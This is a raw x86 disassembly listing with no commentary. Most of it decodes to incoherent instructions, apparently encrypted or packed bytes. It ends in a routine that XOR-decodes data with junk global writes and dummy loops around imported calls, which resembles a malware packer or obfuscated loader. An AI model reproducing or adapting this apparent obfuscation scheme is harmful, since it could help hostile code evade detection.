  410a98:	inc    esp
  410a99:	or     esp,DWORD PTR [edi+0x1a29e4a4]
  410a9f:	js     0x410a30
  410aa1:	pop    edi
  410aa2:	mov    ecx,0x3ddc01
  410aa7:	aam    0xb
  410aa9:	adc    edi,edx
  410aab:	push   ecx
  410aac:	ins    DWORD PTR es:[edi],dx
  410aad:	push   ebp
  410aae:	mov    dh,cl
  410ab0:	fld    TBYTE PTR [bp+si+0x3]
  410ab4:	dec    eax
  410ab5:	inc    DWORD PTR [ebp+ebx*1-0x3b577faa]
  410abc:	loope  0x410a53
  410abe:	call   0x2d91eb80
  410ac3:	sub    DWORD PTR [ecx-0x25],edi
  410ac6:	push   ss
  410ac7:	in     eax,0x89
  410ac9:	in     al,dx
  410aca:	pop    ss
  410acb:	sbb    BYTE PTR [esi-0x660e4efa],0xeb
  410ad2:	pop    ecx
  410ad3:	and    cl,BYTE PTR [edx+0x4613cb8]
  410ad9:	xchg   esp,eax
  410ada:	je     0x410b23
  410adc:	inc    esi
  410add:	lods   al,BYTE PTR ds:[esi]
  410ade:	xchg   ebp,eax
  410adf:	push   esi
  410ae0:	or     ecx,DWORD PTR [ebx+0x28]
  410ae3:	push   edx
  410ae4:	jo     0x410b41
  410ae6:	sbb    eax,0x50d2db0d
  410aeb:	xor    ebp,DWORD PTR [esi+0xe]
  410aee:	aas    
  410aef:	xchg   esp,edx
  410af1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410af2:	popa   
  410af3:	out    0x51,al
  410af5:	adc    eax,DWORD PTR [edi+ebp*4+0xedda730]
  410afc:	sub    eax,0xe0f23260
  410b01:	scas   eax,DWORD PTR es:[edi]
  410b02:	dec    ebp
  410b03:	pop    es
  410b04:	or     DWORD PTR [ebx-0x1261d723],0x1c7510ec
  410b0e:	xor    ebp,esi
  410b10:	or     BYTE PTR [edi-0x7c7b29b1],bh
  410b16:	push   es
  410b17:	push   ss
  410b18:	daa    
  410b19:	add    bh,BYTE PTR [ecx]
  410b1b:	or     eax,0xae54deb8
  410b20:	and    bh,dl
  410b22:	cli    
  410b23:	dec    edx
  410b24:	call   0x360f4a96
  410b29:	ret    0x6459
  410b2c:	stos   BYTE PTR es:[edi],al
  410b2d:	cmp    eax,0x571f04ba
  410b32:	ret    0x7059
  410b35:	arpl   bx,bp
  410b37:	(bad)  [eax]
  410b39:	sub    al,0x40
  410b3b:	and    BYTE PTR [edi],dl
  410b3d:	add    al,0xa3
  410b3f:	test   eax,0xe97bbf67
  410b44:	shl    BYTE PTR [edx],cl
  410b46:	ror    BYTE PTR [ecx],1
  410b48:	pop    ebp
  410b49:	mov    bh,0x4c
  410b4b:	cmc    
  410b4c:	out    dx,al
  410b4d:	pop    ds
  410b4e:	cmp    DWORD PTR [esi+0x53ae9f50],edx
  410b54:	xchg   ebx,eax
  410b55:	imul   ecx,DWORD PTR [edi],0x80cc536b
  410b5b:	nop
  410b5c:	shr    edi,0xd9
  410b5f:	pop    ss
  410b60:	cmc    
  410b61:	iret   
  410b62:	loopne 0x410b27
  410b64:	scas   al,BYTE PTR es:[edi]
  410b65:	not    ch
  410b67:	pop    es
  410b68:	pushf  
  410b69:	adc    dl,BYTE PTR [edx+0x6a]
  410b6c:	adc    DWORD PTR [eax],ecx
  410b6e:	add    ebx,0xef11266
  410b74:	sar    ah,1
  410b76:	sti    
  410b77:	into   
  410b78:	mov    ds:0x8ee8ef15,al
  410b7d:	jecxz  0x410be1
  410b7f:	pushf  
  410b80:	popf   
  410b81:	dec    edx
  410b82:	and    ah,BYTE PTR [ebp-0x2949e78e]
  410b88:	cvtsd2si esi,QWORD PTR [ebx-0xa]
  410b8d:	sub    al,0x9c
  410b8f:	dec    esi
  410b90:	es gs mov al,0x1e
  410b94:	add    eax,0x61ebf539
  410b99:	or     al,0x6d
  410b9b:	xchg   ebp,eax
  410b9c:	retf   
  410b9d:	xchg   cl,ch
  410b9f:	add    al,0xaf
  410ba1:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  410ba3:	das    
  410ba4:	in     eax,0xbd
  410ba6:	and    bl,BYTE PTR [edi+0x5c]
  410ba9:	sub    al,BYTE PTR [ebx+0x34a19279]
  410baf:	dec    edi
  410bb0:	fdiv   QWORD PTR [ecx-0x6d856f62]
  410bb6:	aas    
  410bb7:	add    eax,0x708b1348
  410bbc:	mov    al,0x40
  410bbe:	mov    bh,0xe5
  410bc0:	ret    
  410bc1:	(bad)  
  410bc2:	icebp  
  410bc3:	pop    ebx
  410bc4:	jmp    FWORD PTR [ebp+0x3e]
  410bc7:	stos   DWORD PTR es:[edi],eax
  410bc8:	es cmp eax,0xd425709f
  410bce:	mov    ecx,0xaf8bea35
  410bd3:	xor    dl,bh
  410bd5:	aaa    
  410bd6:	cdq    
  410bd7:	pop    edx
  410bd8:	pop    ebp
  410bd9:	ficomp DWORD PTR [eax-0x5a]
  410bdc:	bound  ebp,QWORD PTR [ebx+0x64]
  410bdf:	adc    BYTE PTR [ecx],dh
  410be1:	cwde   
  410be2:	mov    edi,0xdae32cb3
  410be7:	pop    esi
  410be8:	jmp    0x270e72ac
  410bed:	test   ch,bl
  410bef:	jbe    0x410b93
  410bf1:	inc    edi
  410bf2:	mov    dl,0xbb
  410bf4:	push   es
  410bf5:	cs cwde 
  410bf7:	out    0x5a,al
  410bf9:	rcr    BYTE PTR [ecx-0x44],0xa3
  410bfd:	and    BYTE PTR [ecx-0x105aec9f],ch
  410c03:	sbb    al,0xb7
  410c05:	int3   
  410c06:	fidivr DWORD PTR [esi+0x52b53300]
  410c0c:	or     BYTE PTR [ebx],cl
  410c0e:	cli    
  410c0f:	cmp    dh,dl
  410c11:	sahf   
  410c12:	out    0x7e,eax
  410c14:	xor    eax,0xe344b9db
  410c19:	mov    ecx,0x9ad90359
  410c1e:	out    dx,al
  410c1f:	lods   eax,DWORD PTR ds:[esi]
  410c20:	push   ss
  410c21:	aad    0xa5
  410c23:	cld    
  410c24:	loope  0x410c14
  410c26:	fwait
  410c27:	dec    esi
  410c28:	jmp    0xee7c:0xda2df1e4
  410c2f:	les    ecx,FWORD PTR [eax-0x1d]
  410c32:	in     eax,0xeb
  410c34:	imul   BYTE PTR [esp+esi*2]
  410c37:	popf   
  410c38:	cmp    DWORD PTR [eax+0x778d4c1a],0x43
  410c3f:	es inc esp
  410c41:	or     al,0xfd
  410c43:	and    al,0xba
  410c45:	jne    0x410bd2
  410c47:	mov    ah,0x3f
  410c49:	test   eax,0x9618e62a
  410c4e:	loope  0x410c02
  410c50:	pop    edi
  410c51:	jg     0x410c5c
  410c53:	add    al,0x93
  410c55:	outs   dx,BYTE PTR ds:[esi]
  410c56:	daa    
  410c57:	stos   BYTE PTR es:[edi],al
  410c58:	out    0xb5,eax
  410c5a:	sub    bh,cl
  410c5c:	mov    ecx,0x1059af1b
  410c61:	xchg   edi,eax
  410c62:	fcom   QWORD PTR [eax]
  410c64:	outs   dx,BYTE PTR ds:[esi]
  410c65:	jmp    0x2d6b:0x24258d1a
  410c6c:	cwde   
  410c6d:	fwait
  410c6e:	cdq    
  410c6f:	es iret 
  410c71:	and    BYTE PTR [ecx+0x3b],ch
  410c74:	into   
  410c75:	fsub   QWORD PTR ds:0x1059bdea
  410c7b:	mov    eax,0x9645068
  410c80:	mov    eax,0x7be79259
  410c85:	mov    cl,0x97
  410c87:	dec    edx
  410c88:	mov    WORD PTR [esi+0x2f19c9e8],?
  410c8e:	sbb    al,0x71
  410c90:	or     DWORD PTR [edi],eax
  410c92:	jp     0x410c34
  410c94:	add    al,0x4
  410c96:	xchg   esi,eax
  410c97:	push   esp
  410c98:	mov    esi,0x9408a6e3
  410c9d:	sub    DWORD PTR [eax+eax*2+0x7a],edx
  410ca1:	int    0x67
  410ca3:	(bad)  
  410ca4:	repz jo 0x410c9a
  410ca7:	jecxz  0x410d16
  410ca9:	dec    BYTE PTR [ebx-0x7f]
  410cac:	ds loope 0x410c64
  410caf:	ffreep st(5)
  410cb1:	das    
  410cb2:	arpl   WORD PTR [ebx+0x0],dx
  410cb5:	fcom   DWORD PTR [ecx]
  410cb7:	inc    ebx
  410cb8:	add    BYTE PTR [edi],ch
  410cba:	jge    0x410d18
  410cbc:	(bad)  
  410cbd:	and    eax,0x1bdd19bf
  410cc2:	cli    
  410cc3:	cmp    dh,cl
  410cc5:	aaa    
  410cc6:	loop   0x410d30
  410cc8:	(bad)  
  410cca:	and    dl,BYTE PTR [ebx+0x1b66e4c4]
  410cd0:	scas   al,BYTE PTR es:[edi]
  410cd1:	mov    eax,ds:0x218b7a0b
  410cd6:	imul   esi,esi,0x5a
  410cd9:	xchg   ebx,eax
  410cda:	or     BYTE PTR [ebx+0x7d],ah
  410cdd:	stc    
  410cde:	nop
  410cdf:	add    ah,ah
  410ce1:	sbb    cl,BYTE PTR [ecx+0x663d32df]
  410ce7:	jecxz  0x410ccd
  410ce9:	(bad)  
  410cea:	arpl   cx,ax
  410cec:	ret    
  410ced:	mov    bl,0x81
  410cef:	aad    0xa9
  410cf1:	or     al,0xea
  410cf3:	add    bl,BYTE PTR [ebx+0x7a1bf22f]
  410cf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cfa:	sar    BYTE PTR [eax+0x64],0xd0
  410cfe:	cmp    al,0xc8
  410d00:	nop
  410d01:	ror    DWORD PTR [ecx-0xe91a25d],0x38
  410d08:	mov    esp,0x48d97b6c
  410d0d:	add    DWORD PTR [edx],ebp
  410d0f:	les    edi,FWORD PTR [edx-0x18]
  410d12:	adc    DWORD PTR [ecx],ebp
  410d14:	dec    esp
  410d15:	lds    ecx,FWORD PTR [esi+0x5b4b28a4]
  410d1b:	(bad)  
  410d1c:	fidiv  DWORD PTR [edx+0x6d00a6ea]
  410d22:	and    ebp,DWORD PTR ds:0xf1456dd3
  410d28:	fwait
  410d29:	movsx  edx,BYTE PTR [ebx]
  410d2c:	or     BYTE PTR [esi-0x17b9e854],0xd8
  410d33:	sbb    DWORD PTR [esi+eax*8],ebx
  410d36:	imul   eax,DWORD PTR [ebx-0xc],0xffffffe8
  410d3a:	push   edi
  410d3b:	lds    esi,FWORD PTR [edi-0x5909c69f]
  410d41:	fsub   QWORD PTR [edx]
  410d43:	cs (bad) 
  410d45:	fs std 
  410d47:	aad    0xf1
  410d49:	and    eax,0x50a96f99
  410d4e:	addr16 aam 0xbb
  410d51:	int3   
  410d52:	or     al,0x8f
  410d54:	sub    esp,esi
  410d56:	pop    ss
  410d57:	xchg   DWORD PTR [esi-0x5450a8f2],edx
  410d5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d5e:	ins    BYTE PTR es:[edi],dx
  410d5f:	pop    eax
  410d60:	mov    ch,0x99
  410d62:	ret    0xad59
  410d65:	adc    BYTE PTR [edi-0x6130aa2a],0x10
  410d6c:	xchg   DWORD PTR [esi-0x46],ebp
  410d6f:	dec    ebp
  410d70:	sbb    eax,0x79d2d428
  410d75:	fsub   DWORD PTR [edx]
  410d77:	fist   WORD PTR [ecx-0x9]
  410d7a:	xchg   ebx,eax
  410d7b:	jmp    0x410cfe
  410d7d:	stos   DWORD PTR es:[edi],eax
  410d7e:	bound  edi,QWORD PTR [edi]
  410d80:	sub    bh,ch
  410d82:	js     0x410d87
  410d84:	mov    bh,0x24
  410d86:	aaa    
  410d87:	cdq    
  410d88:	sbb    al,0x80
  410d8a:	dec    eax
  410d8b:	cmp    DWORD PTR [ebx+edi*1],esp
  410d8e:	in     al,dx
  410d8f:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  410d91:	pop    edi
  410d92:	xor    al,BYTE PTR [ecx-0x3f]
  410d95:	dec    esi
  410d96:	push   ecx
  410d97:	fwait
  410d98:	pop    DWORD PTR [edi+0x51b93a11]
  410d9e:	xor    edi,DWORD PTR [ecx-0x6f81dfd6]
  410da4:	jns    0x410d7e
  410da6:	aam    0xdf
  410da8:	test   al,0x3d
  410daa:	pushf  
  410dab:	daa    
  410dac:	retf   
  410dad:	add    ebx,DWORD PTR [ebp+0x39]
  410db0:	in     eax,dx
  410db1:	sti    
  410db2:	jmp    0x410e27
  410db4:	xchg   esp,eax
  410db5:	in     eax,0x25
  410db7:	cmp    DWORD PTR [ecx-0x5c],0xcfc3323b
  410dbe:	adc    eax,DWORD PTR [ecx+esi*8+0x130f2ade]
  410dc5:	dec    ecx
  410dc6:	(bad)  
  410dc7:	in     eax,dx
  410dc8:	frstor [eax-0x17]
  410dcb:	imul   eax,DWORD PTR [ebp-0x50e6f7a],0xfffffff4
  410dd2:	jle    0x410df0
  410dd4:	inc    ecx
  410dd5:	dec    ecx
  410dd6:	pop    ss
  410dd7:	xchg   edx,eax
  410dd8:	retf   0x14ec
  410ddb:	or     BYTE PTR [ebx+0x6aa1b427],0x9b
  410de2:	(bad)
  410de6:	outs   dx,DWORD PTR ds:[esi]
  410de7:	jl     0x410e53
  410de9:	dec    edi
  410dea:	dec    ecx
  410deb:	idiv   edx
  410ded:	(bad)  
  410dee:	rol    BYTE PTR [esp+ecx*2+0x26],cl
  410df2:	pusha  
  410df3:	shr    DWORD PTR [esi+0x74],1
  410df6:	push   es
  410df7:	add    eax,DWORD PTR ds:[edi]
  410dfa:	mov    BYTE PTR [eax+edi*4-0x46],al
  410dfe:	data16 jnp 0x410e6d
  410e01:	jmp    0xcf13be77
  410e06:	sti    
  410e07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e08:	cs imul ebx,esi,0xffffffab
  410e0c:	sub    BYTE PTR [bx+si],ah
  410e0f:	imul   ecx,ebp,0xbc9f428
  410e15:	dec    ecx
  410e16:	bnd jbe 0x410da5
  410e19:	(bad)  
  410e1a:	jge    0x410e58
  410e1c:	jae    0x410e52
  410e1e:	mov    es,WORD PTR [edx-0x3e]
  410e21:	pop    ss
  410e22:	mul    dl
  410e24:	push   esp
  410e25:	icebp  
  410e26:	call   0xeee9:0x66b88583
  410e2d:	add    bh,BYTE PTR [eax]
  410e2f:	div    dh
  410e31:	xchg   ebp,eax
  410e32:	pusha  
  410e33:	les    edx,FWORD PTR [esi+ebx*2-0x6f62b4df]
  410e3a:	jle    0x410dda
  410e3c:	xor    ch,BYTE PTR [esi]
  410e3e:	out    0x3f,al
  410e40:	xchg   edx,eax
  410e41:	mov    esp,0xad3b6e4d
  410e46:	in     al,dx
  410e47:	and    DWORD PTR [ebx],edx
  410e49:	or     BYTE PTR [esi],bh
  410e4b:	or     al,0xc7
  410e4d:	dec    ebp
  410e4e:	je     0x410e71
  410e50:	out    0x35,al
  410e52:	mov    ah,0xf5
  410e54:	sub    al,BYTE PTR [edi+0x1d]
  410e57:	xchg   edx,eax
  410e58:	mov    bh,0x2c
  410e5a:	xchg   ecx,eax
  410e5b:	test   DWORD PTR [edi+0x4d],edi
  410e5e:	lock mov edx,0xef108146
  410e64:	stos   BYTE PTR es:[edi],al
  410e65:	dec    edx
  410e66:	mov    eax,0xd6e63580
  410e6b:	inc    eax
  410e6c:	shr    BYTE PTR [edi+0x60d803c6],cl
  410e72:	xchg   edi,eax
  410e73:	push   ecx
  410e74:	cmc    
  410e75:	sbb    eax,0xc3e7e3db
  410e7a:	int    0xba
  410e7c:	jmp    0x563fab59
  410e81:	sahf   
  410e82:	cmp    eax,0x2eea2e29
  410e87:	mov    esp,cs
  410e89:	dec    ebp
  410e8a:	mov    ch,al
  410e8c:	xlat   BYTE PTR ds:[ebx]
  410e8d:	push   edx
  410e8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e8f:	push   eax
  410e90:	sti    
  410e91:	xchg   ebp,eax
  410e92:	ds addr16 inc esp
  410e95:	sbb    DWORD PTR [edx+0x18c5f497],esi
  410e9b:	fbld   TBYTE PTR [edx]
  410e9d:	in     al,0xbf
  410e9f:	or     eax,0x11685c4f
  410ea4:	inc    eax
  410ea5:	inc    ecx
  410ea6:	or     eax,0x9776a78
  410eab:	xor    al,0x2
  410ead:	ins    DWORD PTR es:[edi],dx
  410eae:	add    esp,DWORD PTR [esi]
  410eb0:	imul   ebx,DWORD PTR [ebx-0xcd79d28],0xffffffb9
  410eb7:	xchg   ch,bl
  410eb9:	mov    ds:0xd6985428,eax
  410ebe:	pop    es
  410ebf:	and    edi,DWORD PTR [edi-0xe96999e]
  410ec5:	push   esi
  410ec6:	clc    
  410ec7:	sub    eax,0x5cb63f57
  410ecc:	xlat   BYTE PTR ds:[ebx]
  410ecd:	push   ebx
  410ece:	fcomp  QWORD PTR [ecx+0x6fb54ce0]
  410ed4:	or     cl,BYTE PTR [ecx]
  410ed6:	loope  0x410f0e
  410ed8:	adc    BYTE PTR [ebx-0x58],ah
  410edb:	retf   
  410edc:	sub    BYTE PTR [edi],dl
  410ede:	push   esi
  410edf:	mov    BYTE PTR [edi],bh
  410ee1:	push   es
  410ee2:	or     bl,BYTE PTR [esi+0x5]
  410ee5:	inc    eax
  410ee6:	les    esi,FWORD PTR [ebx]
  410ee8:	xchg   ecx,eax
  410ee9:	(bad)  
  410eea:	fcomp  DWORD PTR [edi]
  410eec:	push   ecx
  410eed:	sti    
  410eee:	add    DWORD PTR [edi+ebx*1-0x28],ebp
  410ef2:	imul   eax,DWORD PTR [edi+ebp*2-0x50],0x33
  410ef7:	test   DWORD PTR [esp+esi*8],edx
  410efa:	cwde   
  410efb:	dec    edx
  410efc:	xor    dl,al
  410efe:	loop   0x410ed0
  410f00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f01:	shl    cl,cl
  410f03:	sub    cl,al
  410f05:	xchg   ebx,eax
  410f06:	inc    edx
  410f07:	lds    ebx,FWORD PTR [ecx+0x7c]
  410f0a:	push   0xe54c8557
  410f0f:	sbb    eax,0x17388252
  410f14:	pop    edx
  410f15:	aaa    
  410f16:	dec    edx
  410f17:	daa    
  410f18:	sub    dl,BYTE PTR [edx-0x7c82c7f4]
  410f1e:	daa    
  410f1f:	sahf   
  410f20:	mov    esp,0x7d870ebc
  410f25:	and    ebp,edx
  410f27:	outs   dx,DWORD PTR ds:[esi]
  410f28:	lea    dx,[esi-0x66e6ab7c]
  410f2f:	add    eax,0x8a626fb5
  410f34:	ins    BYTE PTR es:[edi],dx
  410f35:	xchg   DWORD PTR [ebx-0x51e0e13d],eax
  410f3b:	jmp    0x9db08984
  410f40:	js     0x410ed7
  410f42:	jae    0x410fa4
  410f44:	mov    cl,cl
  410f46:	cmp    ebp,DWORD PTR [edx*2+0x5d35c3ec]
  410f4d:	xor    eax,0x1591a5e0
  410f52:	push   cs
  410f53:	and    eax,0x3a457829
  410f58:	outs   dx,BYTE PTR ds:[esi]
  410f59:	sbb    DWORD PTR [ebx],0xffffffd2
  410f5c:	inc    esi
  410f5d:	and    esi,DWORD PTR [eax]
  410f5f:	mov    edi,0x9ef04a28
  410f64:	jecxz  0x410f1c
  410f66:	mov    edx,0x78858416
  410f6b:	xchg   edx,eax
  410f6c:	mov    ah,0xe0
  410f6e:	adc    eax,0x413684ca
  410f73:	jecxz  0x410fb7
  410f75:	rol    ah,cl
  410f77:	push   ebp
  410f78:	loop   0x410fa2
  410f7a:	test   eax,0x98f30790
  410f7f:	xor    DWORD PTR [esi+0x43c9dd84],ecx
  410f85:	retf   
  410f86:	shr    DWORD PTR [edi-0x46bdccfc],0xd9
  410f8d:	xchg   ebp,eax
  410f8e:	push   esp
  410f8f:	xlat   BYTE PTR ds:[ebx]
  410f90:	ja     0x410f54
  410f92:	jmp    0x9d47f389
  410f97:	and    ecx,DWORD PTR [ebx-0x7a08a4d4]
  410f9d:	mov    eax,0x9cf71c37
  410fa2:	xlat   BYTE PTR ds:[ebx]
  410fa3:	jne    0x410fc2
  410fa5:	(bad)  
  410fa6:	out    0xa1,al
  410fa8:	adc    DWORD PTR [ebx-0x215920b6],0x54
  410faf:	clc    
  410fb0:	pusha  
  410fb1:	dec    eax
  410fb2:	sbb    DWORD PTR [ecx],esp
  410fb4:	jae    0x41101a
  410fb6:	jp     0x41100a
  410fb8:	jne    0x410f78
  410fba:	rol    BYTE PTR [esi+edi*8+0x33be065c],1
  410fc1:	xchg   esi,eax
  410fc2:	nop
  410fc3:	sub    edx,DWORD PTR [ecx]
  410fc5:	test   eax,0x985b7040
  410fca:	repnz out 0x4d,al
  410fcd:	sbb    BYTE PTR [esp+edi*8],dh
  410fd0:	sbb    DWORD PTR [ecx+0x482a4f2e],0xffffffa0
  410fd7:	sbb    al,0xdb
  410fd9:	cmp    al,0x91
  410fdb:	hlt    
  410fdc:	in     al,dx
  410fdd:	dec    edi
  410fde:	dec    edx
  410fdf:	xchg   BYTE PTR [eax+0x2ed015d3],bh
  410fe5:	pusha  
  410fe6:	dec    edx
  410fe7:	xchg   esi,eax
  410fe8:	cmp    BYTE PTR [esi+0x345909d0],bh
  410fee:	and    BYTE PTR [edi-0x2633b3a1],bl
  410ff4:	fimul  WORD PTR [ebp+0x48]
  410ff7:	pop    es
  410ff8:	nop
  410ff9:	xchg   esi,eax
  410ffa:	sub    al,0xef
  410ffc:	loope  0x410f92
  410ffe:	sbb    al,0x3b
  411000:	mov    eax,ds:0x5c4e1c8a
  411005:	int3   
  411006:	popf   
  411007:	mov    edi,0x11204ce0
  41100c:	and    ebx,DWORD PTR [ecx+0x503967eb]
  411012:	fld    DWORD PTR [esi-0x25]
  411015:	lods   eax,DWORD PTR ds:[esi]
  411016:	pop    esi
  411017:	jle    0x410fc2
  411019:	jl     0xd6683b47
  41101f:	aam    0x4f
  411021:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411022:	fsubr  st(0),st
  411024:	mov    ecx,DWORD PTR [ebp+0x8]
  411027:	mov    eax,0x8a8d
  41102c:	xor    ax,WORD PTR [ecx+0x20]
  411030:	adc    DWORD PTR ds:0x42b000,0x1520
  41103a:	mov    ecx,0x3b51
  41103f:	or     DWORD PTR ds:0x42a008,0x52f2
  411049:	add    ax,cx
  41104c:	or     DWORD PTR ds:0x42c010,ebx
  411052:	movzx  eax,ax
  411055:	mov    DWORD PTR [ebp-0x10],eax
  411058:	xor    DWORD PTR ds:0x429020,ecx
  41105e:	mov    BYTE PTR [ebp-0x1],0x7d
  411062:	lea    eax,[ebp-0x1]
  411065:	and    ecx,DWORD PTR ds:0x429024
  41106b:	mov    DWORD PTR [ebp-0xc],eax
  41106e:	mov    al,BYTE PTR [ebp-0x1]
  411071:	mov    ecx,DWORD PTR [ebp-0xc]
  411074:	xor    DWORD PTR ds:0x42d014,0x42a010
  41107e:	xor    al,0x74
  411080:	sub    al,0x8
  411082:	add    DWORD PTR ds:0x42901c,0x5bfc
  41108c:	mov    BYTE PTR [ecx],al
  41108e:	mov    DWORD PTR [ebp-0x18],0xf89c8585
  411095:	and    DWORD PTR ds:0x42d004,0x0
  41109f:	jmp    0x4110b3
  4110a4:	xor    ecx,ecx
  4110a6:	add    ecx,DWORD PTR ds:0x42d004
  4110ac:	inc    ecx
  4110ad:	mov    DWORD PTR ds:0x42d004,ecx
  4110b3:	cmp    DWORD PTR ds:0x42d004,0x1a
  4110ba:	jae    0x4110fe
  4110c0:	cmp    DWORD PTR ds:0x42d004,0x5
  4110c7:	jne    0x4110d3
  4110cd:	call   DWORD PTR ds:0x42e8f3
  4110d3:	cmp    DWORD PTR ds:0x42d004,0x4
  4110da:	jne    0x4110ef
  4110e0:	xor    ecx,ecx
  4110e2:	xor    ecx,DWORD PTR ds:0x42d004
  4110e8:	inc    ecx
  4110e9:	mov    DWORD PTR ds:0x42d004,ecx
  4110ef:	jmp    0x4110a4
  4110f4:	mov    DWORD PTR ds:0x42901c,0x6887
  4110fe:	push   ebx
  4110ff:	and    DWORD PTR ds:0x42c008,0x0
  411109:	jmp    0x411119
  41110e:	mov    eax,ds:0x42c008
  411113:	inc    eax
  411114:	mov    ds:0x42c008,eax
  411119:	cmp    DWORD PTR ds:0x42c008,0x19
  411120:	jae    0x4111a1
  411126:	cmp    DWORD PTR ds:0x42c008,0x5
  41112d:	jne    0x41113e
  411133:	push   0x42e000
  411138:	call   DWORD PTR ds:0x42e8f7
  41113e:	cmp    DWORD PTR ds:0x42c008,0x4
  411145:	jne    0x411156
  41114b:	mov    eax,ds:0x42c008
  411150:	inc    eax
  411151:	mov    ds:0x42c008,eax
  411156:	jmp    0x41110e
  41115b:	and    DWORD PTR ds:0x429024,0x0
  411165:	mov    ecx,DWORD PTR ds:0x429024
  41116b:	inc    ecx
  41116c:	mov    DWORD PTR ds:0x429024,ecx
  411172:	cmp    DWORD PTR ds:0x429024,0x21
  411179:	jne    0x411192
  41117f:	push   DWORD PTR [ebp-0x14]
  411182:	push   0x42d018
  411187:	push   0x6b2d
  41118c:	call   DWORD PTR ds:0x42e8bf
  411192:	cmp    DWORD PTR ds:0x429024,0x17
  411199:	jb     0x411165
  41119f:	xor    eax,eax
  4111a1:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  4111a8:	and    DWORD PTR ds:0x42a008,0x0
  4111b2:	jmp    0x4111c5
  4111b7:	xor    eax,eax
  4111b9:	or     eax,DWORD PTR ds:0x42a008
  4111bf:	inc    eax
  4111c0:	mov    ds:0x42a008,eax
  4111c5:	cmp    DWORD PTR ds:0x42a008,0x14
  4111cc:	jae    0x41120d
  4111d2:	cmp    DWORD PTR ds:0x42a008,0x5
  4111d9:	jne    0x4111ea
  4111df:	push   0x42e067
  4111e4:	call   DWORD PTR ds:0x42e8fb
  4111ea:	cmp    DWORD PTR ds:0x42a008,0x4
  4111f1:	jne    0x411202
  4111f7:	mov    eax,ds:0x42a008
  4111fc:	inc    eax
  4111fd:	mov    ds:0x42a008,eax
  411202:	jmp    0x4111b7
  411207:	xor    DWORD PTR ds:0x42a018,edx
  41120d:	mov    ecx,DWORD PTR [ebp-0x18]
  411210:	dec    DWORD PTR ds:0x42a010
  411216:	push   esi
  411217:	mov    eax,0x751089b
  41121c:	mov    esi,DWORD PTR ds:0x41cda1
  411222:	mov    esi,DWORD PTR [esi]
  411224:	sub    DWORD PTR ds:0x429028,esi
  41122a:	xor    ecx,eax
  41122c:	inc    esi
  41122d:	mov    esi,0x3272e2
  411232:	add    DWORD PTR ds:0x42b008,0x42d010
  41123c:	push   edi
  41123d:	or     DWORD PTR ds:0x42b004,0x429028
  411247:	add    ecx,esi
  411249:	jmp    0x411277
  41124e:	mov    DWORD PTR ds:0x42c00c,0x285a
  411258:	mov    dl,BYTE PTR [ebp-0x1]
  41125b:	mov    DWORD PTR ds:0x42a00c,0x78fc
  411265:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  41126c:	mov    DWORD PTR ds:0x429024,0x3f09
  411276:	inc    ecx
  411277:	mov    DWORD PTR ds:0x42a00c,0x5b6f
  411281:	cmp    ecx,0x40
  411284:	mov    DWORD PTR ds:0x42d01c,0x4c47
  41128e:	jb     0x41124e
  411294:	mov    edx,DWORD PTR [ebp-0x18]
  411297:	xor    edx,eax
  411299:	add    edx,esi
  41129b:	jmp    0x41130b
  4112a0:	sub    edi,ecx
  4112a2:	mov    edi,DWORD PTR [ebp+0x8]
  4112a5:	add    ecx,0x4f49
  4112ab:	mov    ecx,0x8a8d
  4112b0:	xor    cx,WORD PTR [edi+edx*4+0x2]
  4112b5:	sub    edi,DWORD PTR ds:0x42b00c
  4112bb:	mov    edi,0x3b51
  4112c0:	xor    DWORD PTR ds:0x42c01c,0x429014
  4112ca:	add    cx,di
  4112cd:	movzx  ecx,cx
  4112d0:	mov    DWORD PTR [ebp-0xc],ecx
  4112d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4112d6:	sbb    DWORD PTR ds:0x42b000,0x42d008
  4112e0:	movzx  ecx,WORD PTR [ecx+edx*4]
  4112e4:	xor    ecx,0x8a8d
  4112ea:	adc    DWORD PTR ds:0x42b014,0x42b008
  4112f4:	add    ecx,edi
  4112f6:	mov    edi,DWORD PTR [ebp-0xc]
  4112f9:	mov    DWORD PTR ds:0x42b018,0x62b9
  411303:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  41130a:	inc    edx
  41130b:	mov    ecx,DWORD PTR [ebp-0x10]
  41130e:	mov    DWORD PTR ds:0x42a00c,0x6d31
  411318:	cmp    edx,ecx
  41131a:	mov    DWORD PTR ds:0x429018,0x5128
  411324:	jne    0x4112a0
  41132a:	mov    DWORD PTR ds:0x42c018,0x17
  411334:	cmp    DWORD PTR ds:0x42c018,0x0
  41133b:	je     0x411388
  411341:	cmp    DWORD PTR ds:0x42c018,0x8
  411348:	jne    0x411354
  41134e:	call   DWORD PTR ds:0x42e8ff
  411354:	cmp    DWORD PTR ds:0x42c018,0x9
  41135b:	jne    0x411370
  411361:	xor    edx,edx
  411363:	add    edx,DWORD PTR ds:0x42c018
  411369:	dec    edx
  41136a:	mov    DWORD PTR ds:0x42c018,edx
  411370:	mov    edx,DWORD PTR ds:0x42c018
  411376:	dec    edx
  411377:	mov    DWORD PTR ds:0x42c018,edx
  41137d:	jmp    0x411334
  411382:	adc    ecx,0x40c
  411388:	mov    ecx,DWORD PTR [ebp-0x18]
  41138b:	or     edi,edi
  41138d:	mov    edx,DWORD PTR [ebp+0x10]
  411390:	neg    edi
  411392:	xor    ecx,eax
  411394:	add    DWORD PTR ds:0x42b01c,ebx
  41139a:	add    ecx,esi
  41139c:	mov    DWORD PTR [edx],ecx
  41139e:	and    DWORD PTR ds:0x42b014,0x0
  4113a8:	mov    ecx,DWORD PTR ds:0x42b014
  4113ae:	inc    ecx
  4113af:	mov    DWORD PTR ds:0x42b014,ecx
  4113b5:	cmp    DWORD PTR ds:0x42b014,0x4
  4113bc:	jne    0x4113d5
  4113c2:	push   0x44ec
  4113c7:	push   0x42901c
  4113cc:	push   DWORD PTR [ebp-0x18]
  4113cf:	call   DWORD PTR ds:0x42e903
